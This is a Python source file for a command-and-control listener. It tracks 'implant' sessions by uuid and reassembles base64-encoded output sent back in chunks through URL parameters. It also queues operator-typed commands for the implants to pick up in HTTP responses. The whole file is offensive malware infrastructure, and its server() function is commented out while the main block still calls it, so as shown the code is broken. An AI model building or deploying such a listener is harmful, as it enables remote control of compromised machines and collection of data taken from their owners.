from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import _thread
import base64
import argparse
import sq3db_conn

wait = True
cmds = []
bulk = ""

print("[+] Initializing database...")
sq3db_conn.init_db()
port = sq3db_conn.get_port()

active_sessions = {}




class listener(BaseHTTPRequestHandler):
    def do_GET(self):
        global cmds, bulk, active_sessions

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Cache-Control', 'post-check=0, pre-check=0')
        self.end_headers()

        query = urllib.parse.urlparse(self.path).query
        args = urllib.parse.parse_qs(query)

        if "uuid" in args:
            uuid = args['uuid'][0]
            if uuid not in active_sessions:
               
                print(f"[+] New implant connected: {uuid}")
                sq3db_conn.add_session(name=uuid, mtls=0)
                active_sessions[uuid] = True
            else:
                sq3db_conn.update_check_in(uuid)

        if "arg" in args:
            arg = args['arg'][0]
            arg = arg.replace("_", "+")
            bulk += arg
            if "*" in arg:
                bulk = bulk[:-1]
                pads = len(bulk) % 4
                if pads != 0:
                    bulk += '=' * (4 - pads)
                data = base64.b64decode(bulk)
                print(data.decode("utf-8"), end="")
                bulk = ""

        if len(cmds) > 0:
            self.wfile.write(bytes(cmds.pop(0), "utf-8"))
        return

    def log_message(self, format, *args):
        return


# def server():
#     global wait
#     httpd = HTTPServer(('', port), listener)
#     print('Started listener on port', port)
#     wait = False
#     httpd.serve_forever()


if __name__ == '__main__':
    _thread.start_new_thread(server, ())
    while wait:
        pass
    while "quit" not in cmds:
        cmds.append(input())